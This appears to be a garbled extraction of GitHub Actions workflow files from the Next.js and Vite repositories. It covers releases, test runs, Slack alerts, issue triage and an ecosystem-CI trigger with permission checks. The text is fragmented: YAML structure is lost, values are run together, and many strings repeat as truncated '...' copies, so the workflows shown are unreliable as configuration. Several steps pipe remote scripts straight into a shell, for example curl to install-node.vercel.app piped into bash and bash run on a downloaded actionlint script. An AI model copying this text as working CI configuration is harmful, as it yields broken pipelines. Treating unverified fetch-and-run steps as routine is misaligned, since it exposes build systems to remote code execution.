name: N ... release/home/huawei/github-actions-security/.github/workflows/vercel_next.js__popular.ymlNotify about the top 15 issues/PRs/feature requests (most reacted) in the last 90 daysNotify  ... 90 days0 10 * * 1'0 10 * * 1'cron: ' ... AM EST)- cron: ... AM EST)Issues: Send notification to Slack'Issues ...  Slack'node ./.github/actions/next-repo-actions/dist/issues/index.mjsnode ./ ... dex.mjsPRs: Send notification to Slack'PRs: S ...  Slack'node ./.github/actions/next-repo-actions/dist/prs/index.jsFeature requests: Send notification to Slack'Featur ...  Slack'node ./.github/actions/next-repo-actions/dist/feature-requests/index.mjsname: N ... 90 days/home/huawei/github-actions-security/.github/workflows/vercel_next.js__pull_request_stats.ymlGenerate Pull Request StatsGenerat ... t StatsNEXT_DISABLE_SWC_WASMNEXT_DI ... WC_WASMgenerate-pull-request-stats'genera ... -stats'stepNam ... -stats'uses: . ... ble.ymlstatsPR StatsCheck non-docs only changeCheck n ...  changeecho "DOCS_CHANGE<<EOF" >> $GITHUB_OUTPUT; echo "$(node scripts/run-for-change.js --not --type docs --exec echo 'nope')" >> $GITHUB_OUTPUT; echo 'EOF' >> $GITHUB_OUTPUTecho "D ... _OUTPUT${{ steps.docs-change.outputs.DOCS_CHANGE == 'nope' }}${{ ste ... ope' }}name: PR Stats/home/huawei/github-actions-security/.github/workflows/vercel_next.js__retry_deploy_test.ymlretry-deploy-teststest-e2e-deploy-release'test-e ... elease'['test- ... lease']workflo ... lease']SLACK_WEBHOOK_URL${{ secrets.BROKEN_DEPLOY_SLACK_WEBHOOK_URL }}SLACK_W ... _URL }}retry-on-failureretry failed jobs${{ 
  github.event.workflow_run.conclusion == 'failure' &&
  github.repository == 'vercel/next.js' &&
  github.event.workflow_run.run_attempt < 2
}}send retry request to GitHub APIsend re ... Hub APIgh api \
  --method POST \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  /repos/${{ github.repository }}/actions/runs/${{ github.event.workflow_run.id }}/rerun-failed-jobs
name: s ... Hub API- name: ... Hub APIname: r ... ed jobsreport-failurereport failure to slackreport  ... o slack${{ 
  github.event.workflow_run.conclusion == 'failure' &&
  github.event.workflow_run.run_attempt >= 2 &&
  !github.event.workflow_run.head_repository.fork
}}send webhookslackapi/slack-github-action@v1.25.0slackap ... v1.25.0{
  "commit_title": ${{ toJSON(github.event.workflow_run.display_title) }},
  "commit_url": "github.com/${{ github.repository }}/commit/${{ github.event.workflow_run.head_sha }}",
  "workflow_run_url": "github.com/${{ github.repository }}/actions/runs/${{ github.event.workflow_run.id }}/attempts/${{ github.event.workflow_run.run_attempt }}"
}
payload: |${{ env.SLACK_WEBHOOK_URL }}${{ env ... _URL }}name: send webhook- name: send webhookname: r ... o slackretry-on-failure:name: r ... y-tests/home/huawei/github-actions-security/.github/workflows/vercel_next.js__retry_test.ymlretry-tests'build-and-test''build-and-deploy'['build ... eploy'][canary]workflo ... eploy']${{ secrets.BROKEN_CANARY_SLACK_WEBHOOK_URL }}${{ 
  github.event.workflow_run.conclusion == 'failure' &&
  github.repository == 'vercel/next.js' &&
  github.event.workflow.name != 'build-and-deploy' &&
  github.event.workflow_run.run_attempt < 3
}}${{ 
  github.event.workflow_run.conclusion == 'failure' &&
  (github.event.workflow_run.run_attempt >= 3 || github.event.workflow.name == 'build-and-deploy') &&
  !github.event.workflow_run.head_repository.fork
}}name: retry-tests/home/huawei/github-actions-security/.github/workflows/vercel_next.js__rspack-nextjs-build-integration-tests.ymlRspack Next.js production integration testsRspack  ... n testsRspack integration tests./.github/workflows/integration_tests_reusable.ymlrspack-productionexport NEXT_RSPACK=1 NEXT_TEST_USE_RSPACK=1 \
name: r ... ductiontest-dev:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__rspack-nextjs-dev-integration-tests.ymlRspack Next.js development integration testsrspack-developmentdevelopmentexport NEXT_RSPACK=1 NEXT_TEST_USE_RSPACK=1
name: r ... lopment/home/huawei/github-actions-security/.github/workflows/vercel_next.js__rspack-update-tests-manifest.ymlUpdate Rspack test manifestUpdate  ... anifestupdate_dev_manifestUpdate and upload Rspack development test manifestpnpm iCreate Pull Requestnode scripts/automated-update-workflow.jsnode sc ... flow.js${{ secrets.GH_TOKEN_PULL_REQUESTS }}${{ sec ... ESTS }}rspack-manifestSCRIPTtest/update-bundler-manifest.js --bundler rspack --test-suite dev --overridetest/up ... verrideUpdate Rspack development test manifestThis auto-generated PR updates the development integration test manifest used when testing Rspack.This au ... Rspack.GITHUB_ ... ESTS }}name: C ... Requestname: U ... anifestupdate_build_manifestupdate_ ... anifestUpdate and upload Rspack production test manifesttest/update-bundler-manifest.js --bundler rspack --test-suite build --overrideUpdate Rspack production test manifestThis auto-generated PR updates the production integration test manifest used when testing Rspack.update_dev_manifest:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__setup-nextjs-build.ymlSetup Next.jsbuild_nextjsBuild Next.js for the turbopack integration testBuild N ... on testoutput1${{ steps.build-next-swc-turbopack-patch.outputs.success }}${{ ste ... cess }}output1 ... cess }}${{ inputs.nodeVersion || env.NODE_LTS_VERSION }}Get number of CPU coresGet num ... U coresSimenB/github-actions-cpu-cores@v2SimenB/ ... ores@v2cpu-coresname: G ... U coresSetup Rust toolchain'Setup  ... lchain'name: ' ... lchain'Display runner informationecho runner cpu count ${{ steps.cpu-cores.outputs.count }}echo ru ... ount }}Find Next.js latest release versionFind Ne ... version# Grab the latest release version from next.js repo, including prelease. `/releases/latest` will only return latest stable release.
echo NEXJS_LATEST_VERSION=$(gh release --repo vercel/next.js --limit 1 list | sed -n 1p | awk '{print $1}') >> $GITHUB_ENV
Set Next.js release versionSet Nex ... versionecho "NEXTJS_VERSION=${{ inputs.version != '' && inputs.version || env.NEXJS_LATEST_VERSION }}" >> $GITHUB_ENV
Print Next.js release version to checkoutPrint N ... heckoutecho "Checking out Next.js ${{ env.NEXTJS_VERSION }}"echo "C ... ION }}"name: P ... heckoutCheckout Next.jsvercel/next.js${{ env.NEXTJS_VERSION }}reposit ... next.jsname: C ... Next.jsCheckout failed test listsCheckou ... t listsvercel/turbonextjs-integration-test-datanextjs- ... st-dataintegration-test-dataintegra ... st-datareposit ... l/turboname: C ... t listsDownload binarypath: artifactsname: D ...  binaryactions/cache/restore@v3actions ... tore@v3./*
${{ inputs.version }}-${{ github.sha }}uses: a ... tore@v3wget https://github.com/sharkdp/hyperfine/releases/download/v1.16.1/hyperfine_1.16.1_amd64.deb
sudo dpkg -i hyperfine_1.16.1_amd64.deb
npm i -g corepack@0.31
corepack enable
pnpm install --loglevel error
Build next-swchyperfine --min-runs 1 --show-output 'pnpm run --filter=@next/swc build-native --features plugin --release'
echo "Successfully built next-swc with published turbopack"
name: Build next-swcBuild next.jspnpm run build
strip packages/next-swc/native/next-swc.*.node
ls -al packages/next-swc/native
# Reduce the size of the cache bit
cd packages/next-swc && cargo clean && cd ../../
echo NEXT_SWC_FILESIZE: $(stat -c %s packages/next-swc/native/next-swc.linux-x64-gnu.node)
node -e "console.log('Host', require('os').arch(), require('os').platform())"
name: Build next.jsDetects Next.js build versionDetects ... version# This is being used in github action to collect test results. Do not change it, or should update ./.github/actions/next-integration-test to match.
docker run --rm -v $(pwd):/work mcr.microsoft.com/playwright:v1.28.1-jammy /bin/bash -c 'curl https://install-node.vercel.app/v16 | FORCE=1 bash && cd /work && echo RUNNING NEXTJS VERSION: $(packages/next/dist/bin/next --version) && ls -al packages/next-swc/native && node -e "console.log(\"Container\", require(\"os\").arch(), require(\"os\").platform())"'
Temporary test skiprm -rf test/integration/jsconfig-paths/test/index.test.js
name: T ... st skipStore next.js build cache with next-swcStore n ... ext-swcactions/cache/save@v3actions ... save@v3${{ inputs.version }}-${{ github.sha }}-${{ github.run_id }}-${{ github.run_attempt}}-${{ github.run_number }}name: S ... ext-swc- name: ... Node.jsname: B ... on testbuild_nextjs:name: Setup Next.js/home/huawei/github-actions-security/.github/workflows/vercel_next.js__test-turbopack-rust-bench-test.ymlTurbopack Rust testing benchmarksTurbopa ... chmarksTURBOPACK_BENCH_COUNTSTURBOPA ... _COUNTS'100'TURBOPACK_BENCH_PROGRESSTURBOPA ... ROGRESSTURBOPA ... : '100'${{ fromJSON(inputs.runner) }}Set git to use LFgit config --global core.autocrlf false
git config --global core.eol lf
inputs.os == 'windows'inputs. ... indows'name: S ...  use LFSetup Rustname: Setup RustBuild benchmarks for testsBuild b ... r testscargo test --benches --workspace --release --no-fail-fast --exclude turbopack-bench --exclude next-swc-napi --no-run
name: B ... r testsRun cargo test on benchmarksRun car ... chmarkscargo test --benches --workspace --release --no-fail-fast --exclude turbopack-bench --exclude next-swc-napi
Build benchmarks for tests for other bundlersBuild b ... undlersinputs.allcargo test --benches --release -p turbopack-bench --no-run
name: B ... undlersRun cargo test on benchmarks for other bundlersRun car ... undlerscargo test --benches --release -p turbopack-bench
name: R ... undlers- name: ...  use LFname: T ... chmarks/home/huawei/github-actions-security/.github/workflows/vercel_next.js__test_e2e_deploy_release.ymltest-e2 ... releasenextVersioncanary or custom tarball URLcanary  ... all URLdescrip ... all URLnextVersion:VERCEL_ ... e-testsSetup pnpmname: Setup pnpmSetup test projectpnpm install
pnpm run build
node scripts/run-e2e-test-project-reset.mjs
name: S ... projecttest-deploytest deploynpm i -g vercel@latest && NEXT_E2E_TEST_TIMEOUT=240000 NEXT_TEST_MODE=deploy NEXT_EXTERNAL_TESTS_FILTERS="test/deploy-tests-manifest.json" NEXT_TEST_VERSION="${{ github.event.inputs.nextVersion || 'canary' }}" node run-tests.js --timings -g ${{ matrix.group }} -c 2 --type e2enpm i - ... ype e2eno'no'test-deploy-${{ matrix.group }}["ubuntu-latest"]'["ubuntu-latest"]'afterBu ... ype e2ename: test deployreport-test-results-to-datadogreport- ... datadogreport test results to datadogreport  ... datadogDownload test report artifactsdownload-test-reportsdownloa ... reportstest-reports-*pattern ... ports-*if [ -d ./test/test-junit-report ]; then
  DD_ENV=ci npx @datadog/datadog-ci@2.23.1 junit upload --tags test.type:deploy --service nextjs ./test/test-junit-report
fi
needs: test-deployname: t ... release/home/huawei/github-actions-security/.github/workflows/vercel_next.js__test_examples.ymlis_dispatchedLeave this option enabled'Leave  ... nabled'descrip ... nabled'is_dispatched:0 */4 * * *'0 */4 * * *'cron: '0 */4 * * *'Test examplestestExamples(github.repository == 'vercel/next.js') || (inputs.is_dispatched == true)(github ... = true)Test Examplesnode: [18, 20]run: pnpm builddocker run --rm -v $(pwd):/work mcr.microsoft.com/playwright:v1.35.1-focal /bin/bash -c "cd /work && curl -s https://install-node.vercel.app/v${{ matrix.node }} | FORCE=1 bash && node -v && corepack enable > /dev/null && NEXT_TEST_JOB=1 NEXT_TEST_MODE=start xvfb-run node run-tests.js --type examples >> /proc/1/fd/1"docker  ... 1/fd/1"Run test/examplesrun: do ... 1/fd/1"if: (gi ... = true)testExamples:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__triage.ymlTriage issues[opened, labeled]Nissuer${{
  (github.event_name != 'issue_comment' ||
  (github.event_name == 'issue_comment' && !contains(github.event.issue.labels.*.name, 'stale'))) &&
  github.event.issue.type.name != 'Documentation'
}}balazsorban44/nissuer@1.10.0balazso ... @1.10.0label-area-prefixlabel-area-match'name'label-area-sectionWhich area\(s\) are affected\? \(Select all that apply\)(.*)### Additional context'Which  ... ontext'label-comments{
  "good first issue": ".github/comments/good-first-issue.md",
  "please add a complete reproduction": ".github/comments/invalid-reproduction.md",
  "please simplify reproduction": ".github/comments/simplify-reproduction.md",
  "please verify canary": ".github/comments/verify-canary.md",
  "resolved": ".github/comments/resolved.md"
}
reproduction-comment.github/comments/invalid-link.md'.githu ... ink.md'reproduction-hostsgithub.com,bitbucket.org,gitlab.com,codesandbox.io,stackblitz.com'github ... tz.com'reproduction-blocklistreprodu ... ocklistgithub.com/vercel/next.js.*,github.com/\\w*/?$,github.com$'github ... b.com$'reproduction-link-sectionreprodu ... section### Link to the code that reproduces this issue(.*)### To Reproduce'### Li ... roduce'reproduction-invalid-labelreprodu ... d-labelinvalid link'invalid link'reproduction-issue-labelsreprodu ... -labelsbug,'bug,'comment-unhelpful-weightcomment ... -weight0.5${{ secrets.NISSUER_WEBHOOK_URL }}webhook-secret${{ secrets.NISSUER_WEBHOOK_SECRET }}label-a ... fix: ''uses: b ... @1.10.0- uses: ... @1.10.0name: Nissuername: Triage issues/home/huawei/github-actions-security/.github/workflows/vercel_next.js__triage_with_ai.ymlTriage Issues with AITriage  ... with AISend report to Slack (AI-powered)'Send r ... wered)'node ./.github/actions/next-repo-actions/dist/triage-issues-with-ai/index.jsname: ' ... wered)'OPENAI_API_KEY${{ secrets.OPENAI_API_KEY }}VERCEL_PROTECTION_BYPASSVERCEL_ ... _BYPASS${{ secrets.VERCEL_PROTECTION_BYPASS }}${{ sec ... PASS }}OPENAI_ ... _KEY }}name: T ... with AI/home/huawei/github-actions-security/.github/workflows/vercel_next.js__trigger_release.yml15 23 * * *'15 23 * * *'cron: '15 23 * * *'releaseTypestable, canary, or release candidate?stable, ... didate?release-candidatedescrip ... didate?semverTypesemver type?descrip ... r type?create a new release even if there are no new commitscreate  ... commitsdescrip ... commitsreleaseType:RELEASE ... _TOKEN:Trigger Releaserelease-${{ github.event.inputs.releaseType || 'canary' }}release ... ary' }}Clone Next.js repositoryClone N ... ositorygit clone https://github.com/vercel/next.js.git --depth=25 --single-branch --branch ${GITHUB_REF_NAME:-canary} .git clo ... nary} .Get commit of the latest tagGet com ... est tagecho "LATEST_TAG_COMMIT=$(git rev-list -n 1 $(git describe --tags --abbrev=0))" >> $GITHUB_ENVecho "L ... HUB_ENVname: G ... est tagGet latest commitecho "LATEST_COMMIT=$(git rev-parse HEAD)" >> $GITHUB_ENVname: G ...  commitCheck if new commits since last tagCheck i ... ast tag${{ github.event.inputs.releaseType != 'stable' && github.event.inputs.force != true }}if [ "$LATEST_TAG_COMMIT" = "$LATEST_COMMIT" ]; then
  echo "No new commits. Exiting..."
  exit 1
fi
name: C ... ast tagnpm i -g corepack@0.31
corepack enable
pnpm --version
node ./scripts/start-release.js --release-type ${{ github.event.inputs.releaseType || 'canary' }} --semver-type ${{ github.event.inputs.semverType }}node ./ ... Type }}run: no ... Type }}/home/huawei/github-actions-security/.github/workflows/vercel_next.js__trigger_release_new.ymlTrigger Release (New)Trigger ... e (New)Release Typedescrip ... se TypeForced Releasedescrip ... ReleaseCreate Release Pull RequestCreate  ... Requestversion-packagespnpm ci:versionname: T ... e (New)/home/huawei/github-actions-security/.github/workflows/vercel_next.js__turbopack-nextjs-build-integration-tests.ymlTurbopack Next.js production integration testsTurbopa ... n testsNext.js integration testsNext.js ... n teststurbopack-productionexport IS_TURBOPACK_TEST=1 TURBOPACK_BUILD=1
name: N ... n testsname: T ... n tests/home/huawei/github-actions-security/.github/workflows/vercel_next.js__turbopack-nextjs-dev-integration-tests.ymlTurbopack Next.js development integration teststurbopack-developmentturbopa ... lopmentexport IS_TURBOPACK_TEST=1 TURBOPACK_DEV=1
name: t ... lopment/home/huawei/github-actions-security/.github/workflows/vercel_next.js__turbopack-update-tests-manifest.ymlUpdate Turbopack test manifestUpdate and upload Turbopack development test manifestturbopack-manifesttest/update-bundler-manifest.js --bundler turbopack --test-suite devtest/up ... ite devUpdate Turbopack development test manifestThis auto-generated PR updates the development integration test manifest used when testing Turbopack.This au ... bopack.Update and upload Turbopack production test manifesttest/update-bundler-manifest.js --bundler turbopack --test-suite buildtest/up ... e buildUpdate Turbopack production test manifestThis auto-generated PR updates the production integration test manifest used when testing Turbopack./home/huawei/github-actions-security/.github/workflows/vercel_next.js__update_fonts_data.ymlUpdate Font Data0 0 * * */1'0 0 * * */1'cron: '0 0 * * */1'- cron: ...  * */1'NODE_LTS_VERSION: 20fonts-datascripts/update-google-fonts.jsscripts ... onts.jsUpdate font dataThis auto-generated PR updates font data with latest availableThis au ... ailablecreate-pull-request:name: U ... nt Data/home/huawei/github-actions-security/.github/workflows/vercel_next.js__update_react.ymlUpdate React40 16 * * 1,2,3,4,5cron: 4 ... 2,3,4,5The version to update to. Uses latest Canary if omitted.'The ve ... itted.'descrip ... itted.'Set Git authorgit config user.name "vercel-release-bot"
git config user.email "infra+release@vercel.com"
name: Set Git authorpnpm install --filter .pnpm in ... ilter .pnpm sync-react --actor "${{ github.actor }}" --commit --create-pull --version "${{ inputs.version }}"pnpm sy ... ion }}"name: Update React/home/huawei/github-actions-security/.github/workflows/vercel_next.js__upload-tests-manifest.ymlUpload bundler test manifests to areweturboyet.comUpload  ... yet.comtest/*-manifest.json'test/* ... t.json'- 'test ... t.json'upload_test_resultsUpload test resultsUpload results to "Are We Turbo Yet" KV'Upload ... et" KV'TURBOYET_KV_REST_API_URLTURBOYE ... API_URL${{ secrets.TURBOYET_KV_REST_API_URL }}TURBOYET_KV_REST_API_TOKENTURBOYE ... I_TOKEN${{ secrets.TURBOYET_KV_REST_API_TOKEN }}TURBOYET_TOKEN${{ secrets.TURBOYET_TOKEN }}TURBOYE ... _URL }}./.github/actions/upload-turboyet-data./.gith ... et-dataname: ' ... et" KV'upload_test_results:name: U ... yet.com/home/huawei/github-actions-security/.github/workflows/vitejs_vite__ci.ymlNODE_OPTIONS--max-old-space-size=6144--max-o ... ze=6144VITEST_SEGFAULT_RETRYVITEST_ ... T_RETRYNODE_OP ... ze=6144feat/*fix/*perf/*v[0-9]+"v[0-9]+""v[0-9]+.[0-9]+"${{ github.workflow }}-${{ github.event.number || github.sha }}changedshould_skip${{ steps.changed-files.outputs.only_changed == 'true' }}should_ ... rue' }}fetch-depth: 50tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8tj-acti ... ed29fb8docs/**
.github/**
!.github/workflows/ci.yml
packages/create-vite/template**
**.md
needs.changed.outputs.should_skip != 'true'[ubuntu-latest][20, 22, 24]os: [ubuntu-latest]Build&Test: node-${{ matrix.node_version }}, ${{ matrix.os }}"Build& ... .os }}"pnpm/action-setup@a7487c7e89a18df4991f7f222e4898a00d66dddapnpm/ac ... d66dddaSet node version to ${{ matrix.node_version }}Set nod ... sion }}${{ matrix.node_version }}name: S ... sion }}Install depsname: Install deps(non-windows) Set Playwright path and Get playwright version(non-wi ... versionecho "PLAYWRIGHT_BROWSERS_PATH=$HOME/.cache/playwright-bin" >> $GITHUB_ENV
PLAYWRIGHT_VERSION="$(pnpm ls --depth 0 --json -w playwright-chromium | jq --raw-output '.[0].devDependencies["playwright-chromium"].version')"
echo "PLAYWRIGHT_VERSION=$PLAYWRIGHT_VERSION" >> $GITHUB_ENV
name: ( ... version(windows) Set Playwright path and Get playwright version(window ... versionecho "PLAYWRIGHT_BROWSERS_PATH=$HOME\.cache\playwright-bin" >> $env:GITHUB_ENV
$env:PLAYWRIGHT_VERSION="$(pnpm ls --depth 0 --json -w playwright-chromium | jq --raw-output '.[0].devDependencies["playwright-chromium"].version')"
echo "PLAYWRIGHT_VERSION=$env:PLAYWRIGHT_VERSION" >> $env:GITHUB_ENV
Cache Playwright's binaryCache P ...  binary${{ runner.os }}-playwright-bin-v1-${{ env.PLAYWRIGHT_VERSION }}${{ run ... SION }}${{ env.PLAYWRIGHT_BROWSERS_PATH }}${{ runner.os }}-playwright-bin-v1-
key: ${ ... SION }}Install Playwrightname: I ... ywrightTest unitpnpm run test-unitname: Test unitTest servepnpm run test-servename: Test serveTest buildpnpm run test-buildname: Test buildneeds: changedtest-passed(!cancelled() && !failure())(!cance ... lure())Build & Test Passed or SkippedBuild & ... Skippedecho "Build & Test Passed or Skipped"echo "B ... kipped"run: ec ... kipped"- run:  ... kipped"if: (!c ... lure())test-failed(!cancelled() && failure())Build & Test Failedecho "Build & Test Failed"echo "B ... Failed"run: ec ... Failed"- run:  ... Failed"Lint: node-20, ubuntu-latest"Lint:  ... latest"Set node version to 20Set nod ... n to 20node-version: 20name: S ... n to 20pnpm prettier --write --log-level=warn . && git diff --exit-codepnpm pr ... it-codeTypecheckpnpm run typecheckname: TypecheckTest docspnpm run test-docsname: Test docsCheck workflow filesbash <(curl https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
./actionlint -color -shellcheck=""
name: C ... w filestimeout-minutes: 10changed:/home/huawei/github-actions-security/.github/workflows/vitejs_vite__ecosystem-ci-trigger.ymlecosystem-ci triggertriggergithub.repository == 'vitejs/vite' && github.event.issue.pull_request && startsWith(github.event.comment.body, '/ecosystem-ci run')github. ... i run')issues: ... actionsCheck User PermissionsCheck U ... issionscheck-permissionsconst user = context.payload.sender.login
console.log(`Validate user: ${user}`)

const additionalAllowedUsers = ['lukastaegert']

let hasTriagePermission = false
try {
  const { data } = await github.rest.repos.getCollaboratorPermissionLevel({
    owner: context.repo.owner,
    repo: context.repo.repo,
    username: user,
  });
  hasTriagePermission = data.user.permissions.triage
} catch (e) {
  console.warn(e)
}

if (hasTriagePermission || additionalAllowedUsers.includes(user)) {
  console.log('User is allowed. Adding +1 reaction.')
  await github.rest.reactions.createForIssueComment({
    owner: context.repo.owner,
    repo: context.repo.repo,
    comment_id: context.payload.comment.id,
    content: '+1',
  })
} else {
  console.log('User is not allowed. Adding -1 reaction.')
  await github.rest.reactions.createForIssueComment({
    owner: context.repo.owner,
    repo: context.repo.repo,
    comment_id: context.payload.comment.id,
    content: '-1',
  })
  throw new Error('User does not have the necessary permissions.')
}
Get PR Dataget-pr-dataconsole.log(`Get PR info: ${context.repo.owner}/${context.repo.repo}#${context.issue.number}`)
const { data: pr } = await github.rest.pulls.get({
  owner: context.repo.owner,
  repo: context.repo.repo,
  pull_number: context.issue.number
})
core.setOutput('head_sha', pr.head.sha)
return {
  num: context.issue.number,
  branchName: pr.head.ref,
  commit: pr.head.sha,
  repo: pr.head.repo.full_name
}
name: Get PR DataCheck Package ExistenceCheck P ... istencecheck-packageconst prData = ${{ steps.get-pr-data.outputs.result }}
const url = `https://pkg.pr.new/vite@${prData.commit}`
const response = await fetch(url)
console.log(`Package check URL: ${url}, Status: ${response.status}`)

// Add 'rocket' reaction to the issue comment
if (response.status === 404) {
  const { data: reaction } = await github.rest.reactions.createForIssueComment({
    owner: context.repo.owner,
    repo: context.repo.repo,
    comment_id: context.payload.comment.id,
    content: 'rocket',
  })
  return { exists: false, reaction: reaction.id }
}

return { exists: true, reaction: null }
name: C ... istenceGenerate Tokenactions/create-github-app-token@v2actions ... oken@v2${{ secrets.ECOSYSTEM_CI_GITHUB_APP_ID }}${{ secrets.ECOSYSTEM_CI_GITHUB_APP_PRIVATE_KEY }}repositoriesvite
vite-ecosystem-ci
name: Generate TokenTrigger Preview Release (if Package Not Found)Trigger ...  Found)fromJSON(steps.check-package.outputs.result).exists == falsefromJSO ... = falsetrigger-preview-releasetrigger ... releaseconst prData = ${{ steps.get-pr-data.outputs.result }}
console.log('Package not found, triggering preview release...')

// Add label "trigger: preview" to the PR
await github.rest.issues.addLabels({
  owner: context.repo.owner,
  repo: context.repo.repo,
  issue_number: prData.num,
  labels: ['trigger: preview']
})
console.log('Added "trigger: preview" label.')
name: T ...  Found)Wait for Preview Release Completion (if Package Not Found)Wait fo ...  Found)wait-preview-releaseconst prData = ${{ steps.get-pr-data.outputs.result }}
const reaction = ${{ fromJSON(steps.check-package.outputs.result).reaction }}
const workflowFileName = 'preview-release.yml'
const workflow = await github.rest.actions.getWorkflow({
  owner: context.repo.owner,
  repo: context.repo.repo,
  workflow_id: workflowFileName,
})
const workflowId = workflow.data.id
console.log(`Waiting for workflow ID ${workflowId} to complete...`)

const maxRetries = 60 // Wait up to 10 minutes
const delay = 10000 // 10 seconds
let completed = false

for (let i = 0; i < maxRetries; i++) {
  const runsData = await github.rest.actions.listWorkflowRuns({
    owner: context.repo.owner,
    repo: context.repo.repo,
    workflow_id: workflowId,
    head_sha: prData.commit,
    per_page: 100,
    page: 1,
  })

  const runs = runsData.data.workflow_runs

  if (runs.length > 0) {
    const latestRun = runs[0]
    console.log(`Latest run status: ${latestRun.status}, conclusion: ${latestRun.conclusion}`)
    if (latestRun.status === 'completed') {
      if (latestRun.conclusion === 'success') {
        console.log('Preview release workflow completed successfully.')
        completed = true
        break
      } else if (latestRun.conclusion === 'skipped') {
       // noop
      } else {
        throw new Error('Preview Release workflow failed.')
      }
    }
  }

  console.log(`Retrying... (${i + 1}/${maxRetries})`)
  await new Promise(resolve => setTimeout(resolve, delay))
}

if (!completed) {
  throw new Error('Preview Release workflow did not complete in time.')
}

// Remove the 'rocket' reaction
if (reaction) {
  await github.rest.reactions.deleteForIssueComment({
    owner: context.repo.owner,
    repo: context.repo.repo,
    comment_id: context.payload.comment.id,
    reaction_id: reaction,
  })
  console.log('Removed "rocket" reaction.')
}
name: W ...  Found)refs/pull/${{ fromJSON(steps.get-pr-data.outputs.result).num }}/headrefs/pu ... }}/headref: re ... }}/headCheck Commit Hash AmbiguityCheck C ... biguitycheck_ambiguityHEAD_SHA=${{ steps.get-pr-data.outputs.head_sha }}
COMMIT_SHORT=${HEAD_SHA:0:7}

if git show "$COMMIT_SHORT"; then
  echo "COLLISION=false" >> $GITHUB_ENV
else
  echo "COLLISION=true" >> $GITHUB_ENV
fi
name: C ... biguityTrigger Downstream WorkflowCOMMENT${{ github.event.comment.body }}COMMENT ... body }}const comment = process.env.COMMENT.trim()
const prData = ${{ steps.get-pr-data.outputs.result }}

const suite = comment.split('\n')[0].replace(/^\/ecosystem-ci run/, '').trim()

await github.rest.actions.createWorkflowDispatch({
  owner: context.repo.owner,
  repo: 'vite-ecosystem-ci',
  workflow_id: 'ecosystem-ci-from-pr.yml',
  ref: 'main',
  inputs: {
    prNumber: '' + prData.num,
    branchName: prData.branchName,
    repo: prData.repo,
    commit: process.env.COLLISION === 'false' ? prData.commit : '',
    suite: suite === '' ? '-' : suite
  }
})
- name: ... issionstrigger:name: e ... trigger/home/huawei/github-actions-security/.github/workflows/vitejs_vite__issue-close-require.ymlIssue Close Requiregithub.repository == 'vitejs/vite'github. ... s/vite'needs reproduction"close-issues""needs reproduction"inactive-dayactions ... issues"name: n ... duction- name: ... ductionif: git ... s/vite'name: I ... Require/home/huawei/github-actions-security/.github/workflows/vitejs_vite__issue-labeled.ymlreply-labeledcontribution welcomegithub.event.label.name == 'contribution welcome' || github.event.label.name == 'help wanted'github. ... wanted'remove-labels"remove-labels"pending triage, needs reproduction"pendin ... uction"actions ... labels"name: c ... welcomeremove pending(github.event.label.name == 'enhancement' || contains(github.event.label.description, '(priority)')) && contains(github.event.issue.labels.*.name, 'pending triage')(github ... riage')pending triage"pending triage"name: remove pendinggithub.event.label.name == 'needs reproduction'github. ... uction'create-comment, remove-labels"create ... labels"Hello @${{ github.event.issue.user.login }}. Please provide a [minimal reproduction](https://stackoverflow.com/help/minimal-reproducible-example) using a GitHub repository or [StackBlitz](https://vite.new). Issues marked with `needs reproduction` will be closed if they have no activity within 3 days.
- name: ... welcomereply-labeled:/home/huawei/github-actions-security/.github/workflows/vitejs_vite__lock-closed-issues.ymlLock Closed Issues"14""issues"uses: d ... 71 # v5- uses: ... 71 # v5name: L ...  Issues/home/huawei/github-actions-security/.github/workflows/vitejs_vite__preview-release.ymlPreview releasePLAYWRI ... AD: "1"github.repository == 'vitejs/vite' && (github.event_name == 'push' || (github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'trigger: preview')))
./packages/vitepnpm dlx pkg-pr-new@0.0 publish --compact --pnpm ./packages/vitepnpm dl ... es/viterun: pn ... es/viteif: >preview:name: P ... release/home/huawei/github-actions-security/.github/workflows/vitejs_vite__publish.ymlPublish Package"v*"plugin-*"plugin-*"create-vite*"create-vite*"- "v*"  ... 0.15.10Publish packagepnpm run ci-publish ${{ github.ref_name }}pnpm ru ... name }}name: P ... packagename: P ... Package/home/huawei/github-actions-security/.github/workflows/vitejs_vite__release-tag.ymlAdd GitHub Release TagAdd Git ... ase Tagcontent ... ase tagGet pkgName for tag# skip if alpha
if [[ $GITHUB_REF_NAME =~ alpha ]]; then
  exit 0
fi

# matching v2.0.0 / v2.0.0-beta.8 etc
if [[ $GITHUB_REF_NAME =~ ^v.+ ]]; then
  pkgName="vite"
else
  # `%@*` truncates @ and version number from the right side.
  # https://stackoverflow.com/questions/9532654/expression-after-last-specific-character
  pkgName=${GITHUB_REF_NAME%@*}
fi

echo "pkgName=$pkgName" >> $GITHUB_OUTPUT
name: G ... for tagCreate Release for TagCreate  ... for Tagsteps.tag.outputs.pkgNamesteps.t ... pkgNamerelease_tagyyx990803/release-tag@masteryyx9908 ... @masterPlease refer to [CHANGELOG.md](https://github.com/vitejs/vite/blob/${{ github.ref_name }}/packages/${{ steps.tag.outputs.pkgName }}/CHANGELOG.md) for details.
name: C ... for Tagname: A ... ase Tag/home/huawei/github-actions-security/.github/workflows/vitejs_vite__semantic-pull-request.ymlSemantic Pull RequestSemanti ... Request^(?![A-Z]).+$The subject "{subject}" found in the pull request title "{title}"
didn't match the configured pattern. Please ensure that the subject
doesn't start with an uppercase character.
